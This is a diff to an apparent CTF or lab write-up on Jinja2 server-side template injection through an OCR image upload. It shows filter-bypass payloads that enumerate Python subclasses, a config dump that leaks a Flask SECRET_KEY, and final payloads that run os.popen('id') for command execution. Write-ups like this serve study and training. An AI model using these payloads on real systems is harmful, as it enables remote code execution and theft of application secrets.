@@ -133,30 +133,31 @@ Error occured while processing the image: 'str object' has no attribute 'class'
 
 There was many tries and payloads...
 
-```
+```python
 { {''.class.mro()[1].subclasses()} }
 
 
-{{ "".class.mro()[1].subclasses()}}
+{ { "".class.mro()[1].subclasses()} }
 
 
-// Working:
+# Working with some bypasses:
 
-{{() | attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
+{ {() | attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()} }
 
+{ { () | attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__') } }
 
-{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')
+# Using read function in index 245:
 
-('__import__')('os')|attr('popen')('id')|attr('read')()}}
+{ { () | attr('__class__')|attr('__base__')|attr('__subclasses__')[245] } }
 
+```
 
+Some responses from previous payloads:
 
-{{ () | attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__') }}
-
+```python
 
 <p>&lt;built-in method __getitem__ of list object at 0x7f37f14bf108&gt;
 </p>
-
 
 245
 
@@ -169,32 +170,18 @@ There was many tries and payloads...
  &lt;class &#39;plistlib._PlistParser&#39;&gt;,
  &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;,
 
-
-{{ () | attr('__class__')| attr('__base__')| attr('__subclasses__')()| attr('__getitem__')| attr('popen')('id') | attr('read')()}}
-
-
-<p>tt cycler.__init__. globals__.os.popen('id').read() }}
-</p>
-
-
-{{''.\x5f\x5fclass\x5f\x5f.mro()[1].__subclasses__()[396]}}
-
-
-{{ () | attr('__class__')|attr('__base__')|attr('__subclasses__')[245] }}
-
 ```
 
 I tried to get some extra information with working paylaods:
 
-```
+```python
 {{ config }}
 
 <p>&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: b&#39;_5#y2L&#34;F4Q8z\n\xec]/&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
 </p>
 ```
 
-
-And after so many tries with different letter styles, backgrounds, font size and using spaces so the OCR algorithm can differenciate correctly the characters I got command execution:
+And after so many tries with different letter styles, backgrounds, font size and using spaces so the OCR algorithm can differenciate correctly the characters I got command execution. I used one of the short payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---remote-code-execution):
 
 ```python
 { { cycler.__init__.__globals__.os.popen(' id ').read() } }
